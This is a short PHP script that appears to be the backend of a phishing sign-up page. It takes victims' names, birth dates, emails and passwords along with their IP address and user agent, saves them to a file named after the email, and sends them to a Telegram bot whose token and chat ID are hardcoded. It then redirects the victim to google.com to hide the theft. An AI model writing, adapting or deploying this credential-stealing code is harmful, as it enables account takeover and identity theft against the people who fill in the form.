<?php

$firstname = 'Firtsname: ' . $_POST['firstName'] . ',';
$lastname = ' Lastname: ' . $_POST['lastName'] . ',';
$month = ' Month: ' . $_POST['month'] . ',';
$day = ' Day: ' . $_POST['day'] . ',';
$year = ' Year: ' . $_POST['year'] . ',';
$email = ' Email: ' . $_POST['email'] . ',';
$pwd = ' Password: ' . $_POST['password'] . ',';
$pwdconfirm = ' ConfirmPassword: ' . $_POST["confirmPassword"] . ',';

$user_agent = ' UserAgnet: ' . $_SERVER['HTTP_USER_AGENT'];
$ipaddress = ' IP ADDRESS: ' . getenv("REMOTE_ADDR") . ',';
//Echo "Your IP Address is " . $ipaddress;

$file = $_POST['email'] . '.txt';
$fp = fopen($file, 'w');
fwrite($fp, $firstname);
fwrite($fp, $lastname);
fwrite($fp, $month);
fwrite($fp, $day);
fwrite($fp, $year);
fwrite($fp, $email);
fwrite($fp, $pwd);
fwrite($fp, $pwdconfirm);
fwrite($fp, $ipaddress);
fwrite($fp, $user_agent);
fclose($fp);

$token = "5465447958:AAE8wKRTSOIr-F4jQ7mu1pPZKqAELgWYk9M";
$chat_id = 1062954037;

$textMessage = $firstname. $lastname. $month. $day. $year. $email. $pwd. $pwdconfirm. $user_agent. $ipaddress;
$textMessage = urlencode($textMessage);

$urlQuery = "https://api.telegram.org/bot". $token ."/sendMessage?chat_id=". $chat_id ."&text=" . $textMessage;

$result = file_get_contents($urlQuery);

header('Location:https://google.com');
exit;

?>